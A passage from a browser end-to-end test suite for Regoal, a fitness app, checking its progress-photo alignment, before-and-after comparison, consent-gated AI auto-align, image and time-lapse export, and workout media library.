    ok(slots >= 8, 'every week so far is a slot, not just a few fixed weeks: ' + slots);
    eq(hrefs.length, slots - have); ok(hrefs.every((x) => x === '#/photos'));
    const gap = await tpage.locator('a.tthumb.none').first().getAttribute('aria-label'), gapDate = await tpage.evaluate(() => U.shortDate(Engine.checkinDate(Store.getState().plan.startDate, 2, 5)));
    eq(gap, 'Add Front photo for ' + gapDate); // the first gap is the second weekly check-in, named by its date
    await tpage.locator('a.tthumb.none').first().click();
    await tpage.waitForSelector('.photogrid');
    eq(await tpage.getByLabel('Check-in date').locator('option:checked').innerText(), await tpage.evaluate(() => U.longDate(Engine.checkinDate(Store.getState().plan.startDate, 2, 5)))); // opens the check-in you tapped
    await noWeekWords('photo check-in');
  });

  await step('trend: an angle with no photos says so, and the waist chart shows the check-ins', async () => {
    await route(tpage, '#/photos/trend');
    await tpage.locator('.chart').first().waitFor();
    ok(await tpage.locator('.chart circle').count() >= 3, 'a dot per check-in');
    await tpage.getByRole('button', { name: 'Side', exact: true }).click();
    await tpage.getByText('You have no Side photos yet').waitFor();
    ok(await tpage.getByRole('button', { name: 'Download time-lapse' }).count() === 0, 'nothing to download yet');
    await tpage.getByRole('button', { name: 'Front', exact: true }).click();
    await tpage.waitForSelector('.stage');
  });

  await step('trend: Align photo lets you drag to pan and +/- to zoom, saved per photo and remembered when you return', async () => {
    const stage = tpage.locator('.stage');
    if (await stage.evaluate((el) => el.classList.contains('blur'))) await stage.click(); // reveal before aligning
    eq(await tpage.evaluate(() => Object.keys(Store.getState().photoAligns).length), 0, 'nothing aligned yet');
    await tpage.getByRole('button', { name: 'Align photo' }).click();
    const img = tpage.locator('.stage-img');
    const box = await img.boundingBox();
    await tpage.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
    await tpage.mouse.down();
    await tpage.mouse.move(box.x + box.width / 2 + 40, box.y + box.height / 2 + 20, { steps: 5 });
    await tpage.mouse.up();
    await tpage.getByRole('button', { name: 'Zoom in' }).click();
    await tpage.waitForFunction(() => Object.keys(Store.getState().photoAligns).length > 0);
    const saved = await tpage.evaluate(() => Object.values(Store.getState().photoAligns)[0]);
    ok(saved.scale > 1, 'zoom in raised the scale: ' + saved.scale);
    ok(saved.dx !== 0 || saved.dy !== 0, 'the drag moved it off-centre: ' + JSON.stringify(saved));
    // the style getter re-serializes (drops trailing zeros) and the saved copy is rounded to 3 decimals for
    // storage, so compare the numbers with a little slack rather than the raw strings.
    const nums = (t) => (t.match(/-?[\d.]+/g) || []).map(Number);
    const transform = await img.evaluate((el) => el.style.transform);
    const close = (t, dx, dy, scale) => { const [a, b, c] = nums(t); return Math.abs(a - dx * 100) < 0.5 && Math.abs(b - dy * 100) < 0.5 && Math.abs(c - scale) < 0.01; };
    ok(close(transform, saved.dx, saved.dy, saved.scale), 'the live transform matches what was saved: ' + transform + ' vs saved=' + JSON.stringify(saved));
    await tpage.getByRole('button', { name: 'Done aligning' }).click();
    // leaving and returning shows the same alignment automatically, with align mode itself back off
    await route(tpage, '#/photos');
    await route(tpage, '#/photos/trend');
    eq(await tpage.getByRole('button', { name: 'Done aligning' }).count(), 0, 'align mode is off again on a fresh visit');
    const transform2 = await tpage.locator('.stage-img').evaluate((el) => el.style.transform);
    ok(close(transform2, saved.dx, saved.dy, saved.scale), 'the saved alignment re-applies without needing Align mode on: ' + transform2);
    await tpage.getByRole('button', { name: 'Align photo' }).click();
    await tpage.getByRole('button', { name: 'Reset' }).click();
    await tpage.waitForFunction(() => { const v = Object.values(Store.getState().photoAligns)[0]; return v.scale === 1 && v.dx === 0 && v.dy === 0; });
    await tpage.getByRole('button', { name: 'Done aligning' }).click();
  });

  await step('compare: pick any two dates; slider, side by side and overlay; numbers with the change', async () => {
    await tpage.getByRole('link', { name: 'Compare two dates' }).click();
    await tpage.waitForSelector('.cmp-slider');
    await noWeekWords('compare');
    eq(await tpage.getByLabel('Before').inputValue(), '1'); eq(await tpage.getByLabel('After').inputValue(), '9');
    const handle = tpage.locator('.cmp-handle');
    eq(await handle.getAttribute('aria-valuenow'), '50');
    await handle.focus(); await tpage.keyboard.press('ArrowRight');
    eq(await handle.getAttribute('aria-valuenow'), '55');
    const box = await tpage.locator('.cmp-slider').boundingBox();
    await tpage.mouse.move(box.x + box.width * 0.2, box.y + box.height / 2); await tpage.mouse.down(); await tpage.mouse.move(box.x + box.width * 0.8, box.y + box.height / 2); await tpage.mouse.up();
    ok(Number(await handle.getAttribute('aria-valuenow')) >= 75, 'dragging moves the handle');
    const rows = await tpage.locator('.cmprow:not(.head)').allInnerTexts();
    ok(rows.length === 3 && /Weight/.test(rows[0]) && /82\.0 kg/.test(rows[0]) && /80\.2 kg/.test(rows[0]) && /-1\.8 kg/.test(rows[0]), 'weight row: ' + rows[0]);
    ok(/Waist/.test(rows[1]) && /-1\.8 cm/.test(rows[1]), 'waist row: ' + rows[1]);
    ok(/Chest/.test(rows[2]) && /\+1\.2 cm/.test(rows[2]), 'chest row: ' + rows[2]);
    await tpage.getByRole('radio', { name: 'Side by side' }).click();
    eq(await tpage.locator('.cmp-side img').count(), 2);
    await tpage.getByRole('radio', { name: 'Overlay' }).click();
    await tpage.getByLabel('Blend').fill('20');
    eq(await tpage.locator('.cmp-over').evaluate((el) => el.style.opacity), '0.2');
    await tpage.getByLabel('After').selectOption('5'); await tpage.getByLabel('Before').selectOption('5');
    ok(await tpage.getByRole('button', { name: 'Download image' }).isDisabled(), 'the same check-in twice cannot be downloaded');
    await tpage.getByLabel('Before').selectOption('1'); await tpage.getByLabel('After').selectOption('9');
  });

  await step('compare: Align photos pans/zooms the picked photo instead of moving the reveal line, and Side by side aligns both independently', async () => {
    await tpage.getByRole('radio', { name: 'Slider' }).click();
    await tpage.getByRole('button', { name: 'Align photos' }).click();
    const handle = tpage.locator('.cmp-handle');
    const before = await handle.getAttribute('aria-valuenow');
    const box = await tpage.locator('.cmp-slider').boundingBox();
    await tpage.mouse.move(box.x + box.width * 0.2, box.y + box.height / 2); await tpage.mouse.down();
    await tpage.mouse.move(box.x + box.width * 0.8, box.y + box.height / 2, { steps: 5 }); await tpage.mouse.up();
    eq(await handle.getAttribute('aria-valuenow'), before, 'aligning suppresses the reveal-position drag');
    await tpage.waitForFunction(() => Object.keys(Store.getState().photoAligns).length > 0);
    await tpage.getByRole('radio', { name: 'After' }).click();
    await tpage.getByRole('button', { name: 'Zoom in' }).click();
    await tpage.waitForFunction(() => Object.keys(Store.getState().photoAligns).length >= 2);
    eq(await tpage.evaluate(() => Object.keys(Store.getState().photoAligns).length), 2, 'before and after each got their own saved alignment');
    await tpage.getByRole('button', { name: 'Done aligning' }).click();
    await tpage.getByRole('radio', { name: 'Side by side' }).click();
    await tpage.getByRole('button', { name: 'Align photos' }).click();
    eq(await tpage.getByRole('radio', { name: 'Before' }).count(), 0, 'side by side needs no Before/After picker: both photos are directly draggable');
    // each photo gets its own zoom buttons too, not just drag (side by side has no scroll wheel on a touch screen)
    const scalesBefore = await tpage.evaluate(() => Object.fromEntries(Object.entries(Store.getState().photoAligns).map(([k, v]) => [k, v.scale])));
    await tpage.getByRole('button', { name: 'Zoom in Before', exact: true }).click();
    await tpage.getByRole('button', { name: 'Zoom in After', exact: true }).click();
    await tpage.getByRole('button', { name: 'Zoom in After', exact: true }).click();
    await tpage.waitForFunction((prev) => Object.entries(Store.getState().photoAligns).every(([k, v]) => v.scale > (prev[k] || 1)), scalesBefore);
    const scalesAfter = await tpage.evaluate(() => Store.getState().photoAligns);
    const ids = Object.keys(scalesAfter);
    ok(ids.length === 2 && scalesAfter[ids[0]].scale !== scalesAfter[ids[1]].scale, 'Before and After were zoomed by different amounts, independently: ' + JSON.stringify(scalesAfter));
    await tpage.getByRole('button', { name: 'Reset both' }).click();
    await tpage.waitForFunction(() => Object.values(Store.getState().photoAligns).every((a) => a.scale === 1 && a.dx === 0 && a.dy === 0));
    await tpage.getByRole('button', { name: 'Done aligning' }).click();
  });

  await step('compare: Auto-align with AI offers a key first, then sends only after an explicit confirm, as an editable suggestion', async () => {
    const cbId = await tpage.evaluate(() => Store.getState().photos.find((p) => p.week === 9 && p.angle === 'Front').id);
    await tpage.getByRole('button', { name: 'Align photos' }).click();
    await tpage.getByRole('button', { name: 'Auto-align with AI' }).click();
    await tpage.getByRole('button', { name: 'Add your key' }).waitFor();
    await tpage.keyboard.press('Escape');
    await tpage.evaluate(() => App.setKey('sk-ant-test-0000000000', 'typed'));
    const tai = await fakeAI(tpage, async () => ({ body: textReply(JSON.stringify({ dx: 0.18, dy: -0.12, scale: 1.4, assumptions: ['Shifted and zoomed to match head-to-foot framing.'], confidence: 'medium' })) }));
    await tpage.getByRole('button', { name: 'Auto-align with AI' }).click();
    const sheet = tpage.locator('#sheets').last();
    await sheet.getByText(/Regoal never sends progress photos to AI on its own/).waitFor();
    eq(tai.length, 0, 'nothing sent before confirming');
    await sheet.getByRole('button', { name: 'Send these two photos' }).click();
    await sheet.getByRole('button', { name: 'Use this' }).waitFor();
    eq(tai.length, 1);
    const content = tai[0].messages[tai[0].messages.length - 1].content;
    eq(content.filter((c) => c.type === 'image').length, 2, 'both photos sent, nothing else');
    await sheet.getByText(/Shifted and zoomed to match head-to-foot framing/).waitFor();
    eq(await tpage.evaluate((id) => Store.getState().photoAligns[id].scale, cbId), 1, 'nothing is written to the store yet, only shown live on the photo');
    await sheet.getByRole('button', { name: 'Discard suggestion' }).click();
    eq(await tpage.evaluate(() => Object.values(Store.getState().photoAligns).every((a) => a.scale === 1 && a.dx === 0 && a.dy === 0)), true, 'discarding leaves everything as it was');
    await tpage.getByRole('button', { name: 'Auto-align with AI' }).click();
    await tpage.locator('#sheets').last().getByRole('button', { name: 'Send these two photos' }).click();
    await tpage.locator('#sheets').last().getByRole('button', { name: 'Use this' }).click();
    await tpage.waitForFunction((id) => Store.getState().photoAligns[id].scale > 1, cbId);
    eq(tai.length, 2, 'the accepted run sent its own request too');
    const saved = await tpage.evaluate((id) => Store.getState().photoAligns[id], cbId);
    eq(saved.scale, 1.4); eq(saved.dx, 0.18); eq(saved.dy, -0.12);
    const resetBoth = () => tpage.getByRole('button', { name: 'Reset both' }).click();
    await resetBoth();
    await tpage.waitForFunction(() => Object.values(Store.getState().photoAligns).every((a) => a.scale === 1 && a.dx === 0 && a.dy === 0));
    await tpage.getByRole('button', { name: 'Done aligning' }).click();
  });

  eventsBefore = await tpage.evaluate(() => Store.getEvents().length);
  mediaBefore = await tpage.evaluate(async () => (await Store.allMedia()).length);

  await step('download image: unblurred warning, PNG saved with a plain name, built and kept on this device only', async () => {
    await tpage.getByRole('radio', { name: 'Side by side' }).click();
    await tpage.getByRole('button', { name: 'Download image' }).click();
    const sheet = tpage.locator('#sheets');
    await sheet.getByText('The saved file shows your photos unblurred').waitFor();
    ok(/not encrypted/.test(await sheet.innerText()), 'says it is not encrypted');
    ok(await sheet.locator('.exprev.blur').count() === 1, 'the preview follows the blur setting');
    await sheet.getByRole('radio', { name: 'PNG' }).click();
    await sheet.getByRole('button', { name: 'Save image' }).click();
    await sheet.locator('img.resmedia').waitFor();
    const dim = await sheet.locator('img.resmedia').evaluate((el) => new Promise((r) => { const f = () => r([el.naturalWidth, el.naturalHeight]); el.complete && el.naturalWidth ? f() : (el.onload = f); }));
    eq(dim[0], 1808); ok(dim[1] > 1200, 'photos plus the measurements table: ' + dim[1]);
    const dl = tpage.waitForEvent('download');
    await sheet.getByRole('button', { name: /Download file|Save or share/ }).first().click();
    const d = await dl;
    eq(d.suggestedFilename(), 'regoal-compare-front-' + await isoAt(1) + '-to-' + await isoAt(9) + '.png');
    const p = await d.path(); const head = fs.readFileSync(p).subarray(0, 8);
    eq(Array.from(head), [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    await sheet.getByRole('button', { name: 'Done' }).click();
    eq(await tpage.locator('#sheets .sheet').count(), 0);
  });

  await step('a saved JPEG is a plain re-drawn image with no camera or location block, in each layout', async () => {
    const r = await tpage.evaluate(async () => {
      const st = Store.getState(), cis = Engine.checkIns(st, 'Front').filter((c) => c.photo);
      const a = (await Store.getMedia(cis[0].photo.id)).blob, b = (await Store.getMedia(cis[2].photo.id)).blob;
      const out = [];
      for (const layout of ['side', 'slider', 'overlay']) {
        const blob = await MediaOut.composeComparison({ a: { blob: a, label: 'Fri, 4 Sep' }, b: { blob: b, label: 'Fri, 30 Oct' }, layout, format: 'jpeg', labels: true, rows: [{ name: 'Weight', a: '82.0 kg', b: '80.2 kg', change: '-1.8 kg', tone: '' }], head: ['Sep 4', 'Oct 30'] });
        const u8 = new Uint8Array(await blob.arrayBuffer());
        out.push({ layout, type: blob.type, soi: [u8[0], u8[1]], exif: new TextDecoder('latin1').decode(u8.subarray(0, 400)).includes('Exif') });
      }
      return out;
    });
    for (const x of r) { eq(x.type, 'image/jpeg', x.layout); eq(x.soi, [0xff, 0xd8], x.layout); ok(!x.exif, 'no Exif in ' + x.layout); }
  });

  await step('a saved alignment actually changes what composeComparison and stillFrame draw, not just an auto-centred crop', async () => {
    const r = await tpage.evaluate(async () => {
      const st = Store.getState(), cis = Engine.checkIns(st, 'Front').filter((c) => c.photo);
      const blob = (await Store.getMedia(cis[0].photo.id)).blob;
      const align = { dx: 0.8, dy: 0.8, scale: 3 };
      async function compareBytes(a) {
        const out = await MediaOut.composeComparison({ a: { blob, label: 'A', align: a }, b: { blob, label: 'B' }, layout: 'side', format: 'png', labels: false, rows: null, head: ['', ''] });
        return Array.from(new Uint8Array(await out.arrayBuffer()));
      }
      const base = await compareBytes(null), shifted = await compareBytes(align);
      const diffCompare = base.length !== shifted.length || base.some((v, i) => v !== shifted[i]);
      const stillUrl = async (a) => {
        const cv = await MediaOut.stillFrame({ frames: [{ blob, title: '', numbers: '', align: a }], shape: 'square', labels: false, numbers: false }, 0, 0.3);
        return cv.toDataURL();
      };
      const diffStill = (await stillUrl(null)) !== (await stillUrl(align));
      return { diffCompare, diffStill };
    });
    ok(r.diffCompare, 'composeComparison draws a different image once a photo has a saved alignment');
    ok(r.diffStill, 'the time-lapse frame (same cover() path) also reflects it');
  });

  await step('the exported crop pans the same direction as the live on-screen alignment', async () => {
    // The live preview pans by setting a CSS transform directly on the photo (translate(dx%, dy%)): positive
    // dx/dy slide the photo itself right/down, which brings the photo's opposite (left/top) edge into view.
    // cover() used to move the crop window the same direction as dx/dy instead of the opposite one, so a
    // pan that showed (say) the top-left of a photo on screen saved a file showing the bottom-right instead.
    // Regression test: build a 4-quadrant photo, pan right+down (positive dx/dy), and check the exported
    // crop is centred on the top-left quadrant, matching what that pan shows live.
    const corner = await tpage.evaluate(async () => {
      const c = document.createElement('canvas'); c.width = 600; c.height = 800; const x = c.getContext('2d');
      x.fillStyle = '#ff0000'; x.fillRect(0, 0, 300, 400);    // top-left: red
      x.fillStyle = '#00ff00'; x.fillRect(300, 0, 300, 400);  // top-right: green
      x.fillStyle = '#0000ff'; x.fillRect(0, 400, 300, 400);  // bottom-left: blue
      x.fillStyle = '#ffff00'; x.fillRect(300, 400, 300, 400); // bottom-right: yellow
      const blob = await new Promise((res) => c.toBlob(res, 'image/png'));
      const align = { dx: 0.345, dy: 0.43, scale: 1.322 }; // pan right + down, zoomed in
      const out = await MediaOut.composeComparison({ a: { blob, label: 'A', align }, b: { blob, label: 'B', align: { dx: 0, dy: 0, scale: 1 } }, layout: 'side', format: 'png', labels: false, rows: null, head: ['', ''] });
      const url = URL.createObjectURL(out);
      const img = new Image(); img.src = url; await new Promise((r) => { img.onload = r; });
      const cv = document.createElement('canvas'); cv.width = img.naturalWidth; cv.height = img.naturalHeight;
      const cx = cv.getContext('2d'); cx.drawImage(img, 0, 0);
      URL.revokeObjectURL(url);
      const px = cx.getImageData(Math.floor(img.naturalWidth * 0.25), Math.floor(img.naturalHeight * 0.5), 1, 1).data;
      return [px[0], px[1], px[2]];
    });
    eq(corner, [255, 0, 0], 'center of the Before cell should land in the top-left (red) quadrant, same as the live CSS pan shows, not the opposite bottom-right (yellow) corner');
  });

  await step('a pan saved right at the edge with no zoom still draws the photo, not a blank frame', async () => {
    // dx: 1 at scale: 1 used to put the crop rectangle fully outside the source photo (zero overlap), so
    // that one frame came out as plain background instead of the picture: regression test for that bug.
    const frac = await tpage.evaluate(async () => {
      const st = Store.getState(), cis = Engine.checkIns(st, 'Front').filter((c) => c.photo);
      const blob = (await Store.getMedia(cis[0].photo.id)).blob;
      const cv = await MediaOut.stillFrame({ frames: [{ blob, title: '', numbers: '', align: { dx: 1, dy: 0, scale: 1 } }], shape: 'square', labels: false, numbers: false }, 0, 1);
      const data = cv.getContext('2d').getImageData(0, 0, cv.width, cv.height).data;
      const bg = MediaOut._.C.chalk, br = parseInt(bg.slice(1, 3), 16), bgg = parseInt(bg.slice(3, 5), 16), bb = parseInt(bg.slice(5, 7), 16);
      let bgCount = 0, total = 0;
      for (let i = 0; i < data.length; i += 4) { total++; if (Math.abs(data[i] - br) < 4 && Math.abs(data[i + 1] - bgg) < 4 && Math.abs(data[i + 2] - bb) < 4) bgCount++; }
      return bgCount / total;
    });
    ok(frac < 0.5, 'mostly photo pixels, not the plain background: ' + (frac * 100).toFixed(1) + '% background');
  });

  await step('download time-lapse: warning, real video from the photos, cancel leaves nothing behind', async () => {
    if (!await tpage.evaluate(() => !!MediaOut.pickVideoMime())) { console.log('       (this browser cannot record MP4; skipped)'); return; }
    await route(tpage, '#/photos/trend');
    await tpage.getByRole('button', { name: 'Download time-lapse' }).click();
    const sheet = tpage.locator('#sheets');
    await sheet.getByText('The saved file shows your photos unblurred').waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    eq(await tpage.locator('#sheets .sheet').count(), 0);
    await tpage.getByRole('button', { name: 'Download time-lapse' }).click();
    await sheet.getByRole('radio', { name: 'Square' }).click();
    await sheet.getByRole('radio', { name: '0.5 s' }).click();
    await sheet.getByRole('button', { name: 'Create video' }).click();
    await sheet.locator('video.resmedia').waitFor({ timeout: 20000 });
    const v = await sheet.locator('video.resmedia').evaluate((el) => new Promise((res) => { const f = () => res({ w: el.videoWidth, h: el.videoHeight, d: el.duration, e: el.error && el.error.message }); el.readyState >= 1 ? f() : (el.onloadedmetadata = f, el.onerror = f); }));
    ok(!v.e, 'plays: ' + v.e); eq([v.w, v.h], [1080, 1080]); ok(v.d > 1 && v.d < 4, 'about 3 photos x 0.5 s: ' + v.d);
    const dl = tpage.waitForEvent('download');
    await sheet.getByRole('button', { name: /Download file|Save or share/ }).first().click();
    const d = await dl;
    ok(/^regoal-timelapse-front-\d{4}-\d{2}-\d{2}\.mp4$/.test(d.suggestedFilename()), 'file name: ' + d.suggestedFilename());
    const mp4 = fs.readFileSync(await d.path());
    ok(mp4.length > 1000, 'not empty');
    eq(mp4.subarray(4, 8).toString('latin1'), 'ftyp', 'a real MP4 container, not WebM');
    await sheet.getByRole('button', { name: 'Done' }).click();
  });

  await step('a cancelled recording stops cleanly and returns to the options', async () => {
    if (!await tpage.evaluate(() => !!MediaOut.pickVideoMime())) return;
    await tpage.getByRole('button', { name: 'Download time-lapse' }).click();
    const sheet = tpage.locator('#sheets');
    await sheet.getByRole('radio', { name: '1.5 s' }).click();
    await sheet.getByRole('button', { name: 'Create video' }).click();
    await sheet.getByRole('progressbar').waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
    await sheet.getByRole('button', { name: 'Create video' }).waitFor();
    await sheet.getByRole('button', { name: 'Cancel' }).click();
  });

  await step('exports change nothing that is stored, add nothing to a backup and send nothing off the device', async () => {
    eq(await tpage.evaluate(() => Store.getEvents().length), eventsBefore);
    eq(await tpage.evaluate(async () => (await Store.allMedia()).length), mediaBefore);
    eq(outside, [], 'requests to other origins');
    const bad = /\b(null|undefined|NaN)\b/;
    for (const h of ['#/photos', '#/photos/trend', '#/photos/compare']) { await route(tpage, h); const t = await tpage.locator('#screen').innerText(); ok(!bad.test(t), h + ' shows: ' + (t.match(bad) || [])[0]); }
    eq(tproblems.filter((p) => !/Failed to load resource/.test(p)), [], 'console problems');
  });
  await tctx.close();

  // ================= library, form check and reel =================
  console.log('\nLibrary and reel');
  const lctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  await lctx.addInitScript(() => { window.showOpenFilePicker = undefined; }); // the plain picker: how iPhone Safari behaves
  const lpage = await lctx.newPage(); lpage.setDefaultTimeout(8000);
  const lproblems = await collect(lpage);
  const loutside = [];
  lpage.on('request', (r) => { const u = r.url(); if (!u.startsWith(base.replace('/index.html', '')) && !/^(blob|data):/.test(u) && !/api\.anthropic\.com/.test(u)) loutside.push(u); });
  const lai = await fakeAI(lpage, async () => ({ body: textReply('You can see the bar over mid-foot. Try keeping your chest up on the way out of the hole.') }));
  await lpage.goto(base);
  await lpage.waitForSelector('text=Track the change.');
  await lpage.evaluate(async () => {
    const start = Engine.addDays(U.today(), -70), at = (w) => Engine.addDays(start, (w - 1) * 7);
    const a = { sex: 'male', age: 31, heightCm: 180, weightKg: 82, units: { body: 'kg', length: 'cm', lift: 'lb' }, measurements: { waist: 86, chest: 100 }, goal: 'recomp', days: [1, 2, 3, 4, 5], startDate: start,
      training: { split: 'auto', dbStep: 2.5, machineStep: 5, sets: 3, repStyle: 'mixed', deload: 'planned' }, lifts: [{ id: 'flat_db_press', on: true, weight: 40, reps: 8 }] };
    await Store.append('profile_created', { profile: a, plan: Engine.buildPlan(a) });
    await Store.saveSettings({ bodyUnit: 'kg', lenUnit: 'cm', liftUnit: 'lb', onboardedAt: new Date().toISOString(), blurPhotos: false });
    for (const w of [1, 5]) {
      const b = await new Promise((res) => { const c = document.createElement('canvas'); c.width = 300; c.height = 400; const x = c.getContext('2d'); x.fillStyle = 'hsl(' + (w * 30) + ',30%,25%)'; x.fillRect(0, 0, 300, 400); c.toBlob(res, 'image/jpeg', 0.8); });
      await Store.putMedia('p_' + w + '_front_l', b, { week: w, angle: 'Front' });
      await Store.append('photo_added', { date: at(w), week: w, angle: 'Front', id: 'p_' + w + '_front_l' });
    }
  });
  // a photo and a short video made in the page, handed over through the file chooser like a real pick
  const fx = await lpage.evaluate(async () => {
    const photo = await new Promise((res) => { const c = document.createElement('canvas'); c.width = 1200; c.height = 1600; const x = c.getContext('2d'); x.fillStyle = '#284'; x.fillRect(0, 0, 1200, 1600); x.fillStyle = '#fff'; x.fillRect(400, 300, 400, 900); c.toBlob(res, 'image/jpeg', 0.9); });
    const mt = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    const video = await new Promise((res) => {
      const c = document.createElement('canvas'); c.width = 640; c.height = 480; const x = c.getContext('2d');
      const rec = new MediaRecorder(c.captureStream(30), { mimeType: mt }); const ch = []; rec.ondataavailable = (e) => ch.push(e.data); rec.onstop = () => res(new Blob(ch, { type: mt }));
      rec.start(); let f = 0; const t = setInterval(() => { x.fillStyle = 'hsl(' + (f * 9) + ',60%,40%)'; x.fillRect(0, 0, 640, 480); x.fillStyle = '#fff'; x.fillRect(20 + f * 8, 200, 80, 80); if (++f > 60) { clearInterval(t); rec.stop(); } }, 33);
    });
    const buf = async (b) => Array.from(new Uint8Array(await b.arrayBuffer()));
    return { photo: await buf(photo), video: await buf(video), vtype: mt };
  });
  const lfiles = [{ name: 'IMG_0001.jpg', mimeType: 'image/jpeg', buffer: Buffer.from(fx.photo) }, { name: 'IMG_0002.' + (fx.vtype === 'video/webm' ? 'webm' : 'mp4'), mimeType: fx.vtype, buffer: Buffer.from(fx.video) }];
  const mediaKinds = () => lpage.evaluate(async () => { const all = await Store.allMedia(); const k = {}; for (const m of all) { const n = m.kind || 'progress'; k[n] = (k[n] || 0) + 1; } return k; });
  const pickFiles = async (buttonName, sheetScope) => {
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), (sheetScope || lpage).getByRole('button', { name: buttonName }).click()]);
    await fc.setFiles(lfiles);
  };

  await step('library: add a photo and a video; small previews for both, a compressed copy for the photo, never the original file', async () => {
    await route(lpage, '#/progress');
    await lpage.getByRole('link', { name: 'Open' }).last().click();
    await lpage.waitForSelector('text=Your workout photos and videos');
    const before = await mediaKinds();
    await pickFiles('Add photos or videos');
    const sheet = lpage.locator('#sheets');
    await sheet.getByText('Nothing is copied').waitFor();
    await sheet.getByRole('button', { name: 'Personal best' }).click();
    await sheet.getByRole('button', { name: 'Add', exact: true }).click();
    await lpage.waitForSelector('.libtile');
    eq(await lpage.locator('.libtile').count(), 2);
    const clips = await lpage.evaluate(() => Store.getState().clips.map((c) => ({ kind: c.kind, tag: c.tag, name: c.name, size: c.size, w: c.w, h: c.h, dur: c.dur, thumb: !!c.thumb, full: !!c.full })));
    eq(clips.map((c) => c.kind).sort(), ['photo', 'video']);
    ok(clips.every((c) => c.tag === 'Personal best' && c.thumb), 'tag and preview kept');
    const photo = clips.find((c) => c.kind === 'photo'), v = clips.find((c) => c.kind === 'video');
    ok(photo.full, 'the photo got a compressed full copy');
    ok(!v.full, 'the video did not');
    ok(v.dur > 1 && v.dur < 4, 'video length worked out even when the recorder left it out: ' + v.dur);
    const after = await mediaKinds();
    eq(after.thumb, 2, 'two previews');
    eq(after.full, 1, 'one compressed photo copy');
    eq(after.progress, before.progress, 'progress photos untouched');
    const bytes = await lpage.evaluate(async () => (await Store.allMedia()).filter((m) => m.kind === 'thumb').reduce((t, m) => t + m.size, 0));
    ok(bytes < 60000, 'previews are small: ' + bytes + ' bytes against ' + (fx.photo.length + fx.video.length) + ' for the originals');
    const fullBytes = await lpage.evaluate(async () => (await Store.allMedia()).filter((m) => m.kind === 'full').reduce((t, m) => t + m.size, 0));
    ok(fullBytes < 400000, 'the compressed photo copy is not the original: ' + fullBytes + ' bytes');
    const stored = await lpage.evaluate(() => JSON.stringify(Store.getEvents()));
    ok(!stored.includes('base64') && stored.length < 20000, 'no file content in the event log');
  });

  await step('library: adding the same files again skips them; edit, filter and remove work', async () => {
    await pickFiles('Add photos or videos');
    await lpage.locator('#sheets').getByRole('button', { name: 'Add', exact: true }).click();
    await lpage.waitForSelector('text=already in the library');
    eq(await lpage.evaluate(() => Store.getState().clips.length), 2);
    await lpage.waitForTimeout(300);
    await lpage.locator('.libtile').first().click();
    const sheet = lpage.locator('#sheets');
    await sheet.getByRole('button', { name: 'Form check' }).click();
    await sheet.getByLabel('Note').fill('Top set');
    await sheet.getByRole('button', { name: 'Save' }).click();
    await lpage.waitForTimeout(300);
    eq(await lpage.evaluate(() => Store.getState().clips.filter((c) => c.tag === 'Form check').length), 1);
    eq(await lpage.evaluate(() => Store.getState().clips.length), 2, 'an edit replaces, it does not duplicate');
    await lpage.getByRole('button', { name: 'Form check', exact: true }).click();
    eq(await lpage.locator('.libtile').count(), 1);
    await lpage.getByRole('button', { name: 'All', exact: true }).click();
    await lpage.locator('.libtile').last().click();
    await sheet.getByRole('button', { name: 'Remove' }).click();
    await sheet.getByRole('button', { name: 'Remove' }).last().click();
    await lpage.waitForTimeout(300);
    eq(await lpage.evaluate(() => Store.getState().clips.length), 1);
    eq((await mediaKinds()).thumb, 1, 'its preview went with it');
    await pickFiles('Add photos or videos');
    await lpage.locator('#sheets').getByRole('button', { name: 'Add', exact: true }).click();
    await lpage.waitForFunction(() => Store.getState().clips.length === 2);
  });

  await step('library: watching a video asks for the file again and stores nothing', async () => {
    const before = await mediaKinds();
    await lpage.getByRole('button', { name: /video from/ }).click();
    const sheet = lpage.locator('#sheets');
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Watch the original' }).click()]);
    await fc.setFiles(lfiles[1]);
    await lpage.locator('#sheets .resmedia').last().waitFor();
    ok(/not keeping a copy/.test(await lpage.locator('#sheets').innerText()), 'says it is not kept');
    eq(await mediaKinds(), before, 'no new media stored');
    await lpage.locator('#sheets').getByRole('button', { name: 'Close' }).last().click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
  });

  await step('library: viewing a photo shows its compressed copy at once, with no file prompt and no new storage', async () => {
    const before = await mediaKinds();
    const t0 = Date.now();
    await lpage.getByRole('button', { name: /photo from/ }).click();
    const sheet = lpage.locator('#sheets');
    await sheet.getByRole('button', { name: 'View photo' }).click();
    await lpage.locator('#sheets .resmedia').last().waitFor();
    ok(Date.now() - t0 < 2000, 'it opened straight from the tap, no file picker needed');
    ok(/compressed copy/.test(await lpage.locator('#sheets').innerText()), 'says it kept a compressed copy');
    eq(await mediaKinds(), before, 'no new media stored: the copy was made when the photo was added');
    await lpage.locator('#sheets').getByRole('button', { name: 'Close' }).last().click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
  });

  await step('library: a video the browser cannot show gets a plain note instead of a blank box, and the tap opens the picker at once', async () => {
    await lpage.getByRole('button', { name: /video from/ }).click();
    const sheet = lpage.locator('#sheets');
    const t0 = Date.now();
    const [fc] = await Promise.all([lpage.waitForEvent('filechooser'), sheet.getByRole('button', { name: 'Watch the original' }).click()]);
    ok(Date.now() - t0 < 2000, 'the picker opened straight from the tap');
    await fc.setFiles({ name: 'broken.mp4', mimeType: 'video/mp4', buffer: Buffer.from('this is not a video') });
    await lpage.locator('#sheets .resmedia').last().waitFor();
    await lpage.getByText(/cannot show this file/).waitFor();
    await lpage.locator('#sheets').getByRole('button', { name: 'Close' }).last().click();
    await lpage.locator('#sheets').getByRole('button', { name: 'Save' }).click();
    await lpage.waitForTimeout(200);
  });

  await step('library: previews and entries survive a backup and restore; a hostile entry in a backup is ignored', async () => {
    const bare = await lpage.evaluate(async () => JSON.parse(await Store.buildBackup({})).media.some((m) => m.kind === 'full'));
    ok(bare === false, 'a plain backup leaves out the compressed photo copy');
    const r = await lpage.evaluate(async () => {
      const text = await Store.buildBackup({ media: true });
      const obj = JSON.parse(text);
